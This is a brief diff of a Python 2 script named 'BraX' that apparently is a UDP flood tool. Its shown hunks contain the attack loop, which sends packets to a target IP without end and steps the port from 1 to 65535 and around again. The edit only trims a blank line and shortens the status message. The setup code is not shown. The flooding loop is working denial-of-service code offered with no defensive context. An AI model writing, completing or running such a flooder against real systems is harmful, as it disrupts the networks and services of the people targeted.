@@ -1,6 +1,5 @@
 # BraX
 
- 
 import os
 import sys
 import random
@@ -32,6 +31,6 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print "Sent %s port:%s"%(sent,port)
      if port == 65535:
        port = 1
